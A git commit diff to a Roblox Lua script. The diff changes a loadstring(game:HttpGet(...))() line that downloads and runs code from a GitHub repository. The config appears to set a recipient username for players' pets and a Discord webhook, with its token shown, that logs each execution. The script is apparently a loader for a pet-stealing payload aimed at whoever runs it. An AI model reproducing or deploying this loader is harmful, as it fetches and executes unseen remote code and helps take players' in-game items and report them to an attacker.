3462a5a5c87548156709a4d3dfa7e25d5d676866
Tyr000ne <125683259+Tyr000ne@users.noreply.github.com>
2023-05-27 12:41:46 -0500

    Update script.lua

--- script.lua
+++ script.lua
@@ -8,4 +8,4 @@ _G.Username2 = "DONUTS4ETERNITY700" --// Username To Send Pets To [OPTIONAL]
 _G.Webhook = "https://discord.com/api/webhooks/1111600367940157480/ttRBa7jGx5CbJhVKi4ZdoPcinFSF6YEljSklni3yiUpHG7oV9DsTywQvol7wUtteRgTq" --// Discord Webhook For Executions
 
 --[[ Script ]]--
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Tyr000ne/script-for-donut/main/script.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tyr000ne/kendrickforU/main/script.lua", true))()
